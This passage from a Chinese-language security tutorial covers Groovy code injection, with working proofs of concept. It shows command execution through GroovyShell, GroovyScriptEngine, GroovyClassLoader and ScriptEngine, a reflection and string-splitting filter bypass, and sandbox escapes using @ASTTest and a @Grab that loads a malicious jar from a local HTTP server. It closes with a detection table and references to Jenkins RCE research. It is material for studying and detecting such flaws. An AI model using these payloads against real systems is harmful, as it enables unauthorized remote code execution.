    "${'calc'.execute()}"
    // 回显型命令执行
    println "whoami".execute().text
    println 'whoami'.execute().text
    println "${"whoami".execute().text}"
    println "${'whoami'.execute().text}"
    def cmd = "whoami";
    println "${cmd.execute().text}";
### 注入点
在下面一些场景中，会触发Groovy代码注入漏洞。
#### GroovyShell
GroovyShell允许在Java类中（甚至Groovy类）解析任意Groovy表达式的值。
GroovyShellExample.java：
    import groovy.lang.GroovyShell;
    public class GroovyShellExample {
        public static void main( String[] args ) {
            GroovyShell groovyShell = new GroovyShell();
            groovyShell.evaluate("\"calc\".execute()");
        }
    }
直接运行即可弹计算器：
或者换成运行Groovy脚本的方式也是也一样的：
    import groovy.lang.GroovyShell;
    import groovy.lang.Script;
    import java.io.File;
    public class GroovyShellExample {
        public static void main( String[] args ) throws Exception {
            GroovyShell groovyShell = new GroovyShell();
            Script script = groovyShell.parse(new File("src/test.groovy"));
            script.run();
        }
    }
test.groovy：
    println "whoami".execute().text
此外，可使用Binding对象输入参数给表达式，并最终通过GroovyShell返回Groovy表达式的计算结果。
#### GroovyScriptEngine
GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们。如同GroovyShell一样，GroovyScriptEngine也允许传入参数值，并能返回脚本的计算值。
GroovyScriptEngineExample.java，直接运行即加载Groovy脚本文件实现命令执行：
    import groovy.lang.Binding;
    import groovy.util.GroovyScriptEngine;
    public class GroovyScriptEngineExample {
        public static void main(String[] args) throws Exception {
            GroovyScriptEngine groovyScriptEngine = new GroovyScriptEngine("");
            groovyScriptEngine.run("src/test.groovy",new Binding());
        }
    }
test.groovy脚本文件如之前。
#### GroovyClassLoader
GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类。
GroovyClassLoaderExample.java，直接运行即加载Groovy脚本文件实现命令执行：
    import groovy.lang.GroovyClassLoader;
    import groovy.lang.GroovyObject;
    import java.io.File;
    public class GroovyClassLoaderExample {
        public static void main(String[] args) throws Exception {
            GroovyClassLoader groovyClassLoader = new GroovyClassLoader();
            Class loadClass = groovyClassLoader.parseClass(new File("src/test.groovy"));
            GroovyObject groovyObject = (GroovyObject) loadClass.newInstance();
            groovyObject.invokeMethod("main","");
        }
    }
test.groovy脚本文件如之前。
#### ScriptEngine
ScriptEngine脚本引擎是被设计为用于数据交换和脚本执行的。
  * 数据交换：表现在调度引擎的时候，允许将数据输入/输出引擎，至于引擎内的数据持有的具体方式有两种：普通的键值对和Bindings（interface Bindings extends Map）；
  * 脚本执行：脚本引擎执行表现为调用eval()；
ScriptEngineManager类是一个脚本引擎的管理类，用来创建脚本引擎，大概的方式就是在类加载的时候通过SPI的方式，扫描ClassPath中已经包含实现的所有ScriptEngineFactory，载入后用来负责生成具体的ScriptEngine。
在ScriptEngine中，支持名为“groovy”的引擎，可用来执行Groovy代码。这点和在SpEL表达式注入漏洞中讲到的同样是利用ScriptEngine支持JS引擎从而实现绕过达到RCE是一样的。
ScriptEngineExample.java，直接运行即命令执行：
    import javax.script.ScriptEngine;
    import javax.script.ScriptEngineManager;
    public class ScriptEngineExample {
        public static void main( String[] args ) throws Exception {
            ScriptEngine groovyEngine = new ScriptEngineManager().getEngineByName("groovy");
            groovyEngine.eval("\"calc\".execute()");
        }
    }
执行Groovy脚本，需要实现读取文件内容的接口而不能直接传入File类对象：
    import javax.script.ScriptEngine;
    import javax.script.ScriptEngineManager;
    import java.io.BufferedReader;
    import java.io.FileReader;
    public class ScriptEngineExample {
        public static void main( String[] args ) throws Exception {
            ScriptEngine groovyEngine = new ScriptEngineManager().getEngineByName("groovy");
            String code = readfile("src/test.groovy");
            groovyEngine.eval(code);
        }
        public static String readfile(String filename) throws Exception {
            BufferedReader in = new BufferedReader(new FileReader(filename));
            String string = "";
            String str;
            while ((str = in.readLine()) != null) {
                string = string + str;
            }
            return string;
        }
    }
test.groovy脚本文件如之前。
## 0x04 Bypass Tricks
### 利用反射机制和字符串拼接Bypass
直接的命令执行在前面已经说过几种形式了：
    // 直接命令执行
    Runtime.getRuntime().exec("calc")
    "calc".execute()
    'calc'.execute()
    "${"calc".execute()}"
    "${'calc'.execute()}"
    // 回显型命令执行
    println "whoami".execute().text
    println 'whoami'.execute().text
    println "${"whoami".execute().text}"
    println "${'whoami'.execute().text}"
    def cmd = "whoami";
    println "${cmd.execute().text}";
在某些场景下，程序可能会过滤输入内容，此时可以通过反射机制以及字符串拼接的方式来绕过实现命令执行：
    import java.lang.reflect.Method;
    Class rt = Class.forName("java.la" + "ng.Run" + "time");
    Method gr = rt.getMethod("getR" + "untime");
    Method ex = rt.getMethod("ex" + "ec", String.class);
    ex.invoke(gr.invoke(null), "ca" + "lc")
### Groovy沙箱Bypass
前面说到的Groovy代码注入都是注入了execute()函数，从而能够成功执行Groovy代码，这是因为不是在Jenkins中执行即没有Groovy沙箱的限制。但是在存在Groovy沙箱即只进行AST解析无调用或限制execute()函数的情况下就需要用到其他技巧了。这也是Orange大佬在绕过Groovy沙箱时用到的技巧。
#### @AST注解执行断言
参考Groovy的[Meta Programming手册](http://groovy-lang.org/metaprogramming.html)，利用AST注解能够执行断言从而实现代码执行（本地测试无需assert也能触发代码执行）。
PoC：
    this.class.classLoader.parseClass('''
        @groovy.transform.ASTTest(value={
            assert Runtime.getRuntime().exec("calc")
        })
        def x
    ''');
本地测试：
#### @Grab注解加载远程恶意类
@Grab注解的详细用法在[Dependency management with Grape](http://docs.groovy-lang.org/latest/html/documentation/grape.html)中有讲到，简单地说，Grape是Groovy内建的一个动态Jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。
编写恶意Exp类，命令执行代码写在其构造函数中：
    public class Exp {
        public Exp(){
            try {
                java.lang.Runtime.getRuntime().exec("calc");
            } catch (Exception e) { }
        }
    }
依次运行如下命令：
    javac Exp.java
    mkdir -p META-INF/services/
    echo Exp > META-INF/services/org.codehaus.groovy.plugins.Runners
    jar cvf poc-0.jar Exp.class META-INF
先在Web根目录中新建`/test/poc/0/`目录，然后复制该jar包到该子目录下，接着开始HTTP服务。
PoC：
    this.class.classLoader.parseClass('''
        @GrabConfig(disableChecksums=true)
        @GrabResolver(name='Exp', root='http://127.0.0.1:8000/')
        @Grab(group='test', module='poc', version='0')
        import Exp;
    ''')
运行，成功请求远程恶意Jar包并导入恶意Exp类执行其构造函数，从而导致RCE：
## 0x05 排查方法
排查关键类函数特征：
关键类 | 关键函数  
---|---  
groovy.lang.GroovyShell | evaluate  
groovy.util.GroovyScriptEngine | run  
groovy.lang.GroovyClassLoader | parseClass  
javax.script.ScriptEngine | eval  
## 0x06 参考
[Hacking Jenkins Part 1 - Play with Dynamic
Routing](http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html)
[Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated
RCE!](http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)
[Jenkins RCE分析（CVE-2018-1000861分析）](https://www.anquanke.com/post/id/172796)
[Jenkins groovy scripts for read teamers and penetration
testers](https://xz.aliyun.com/t/6372)